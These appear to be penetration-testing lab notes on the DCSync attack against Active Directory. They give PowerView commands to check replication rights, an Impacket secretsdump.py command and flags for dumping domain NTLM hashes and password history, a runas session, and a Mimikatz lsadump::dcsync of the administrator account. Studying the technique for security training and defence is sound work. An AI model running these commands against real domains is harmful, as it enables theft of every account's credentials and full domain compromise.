
```
DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.
```

DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py.

Check users Replication Rights
```
Import-Module ./Powerview.ps1

$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"

Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

Extracting ntlm hashes and kerberos tickets
```shell-session
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```
 `-just-dc-ntlm` flag if we only want NTLM hashes or specify `-just-dc-user <USERNAME>`
`-pwd-last-set` to see when each account's password was last changed and `-history` if we want to dump password history
`-user-status` is another helpful flag to check and see if a user is disabled

Create powershell session with user privileges
```cmd-session
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

Using mimikatz
```powershell-session
PS C:\htb> .\mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```


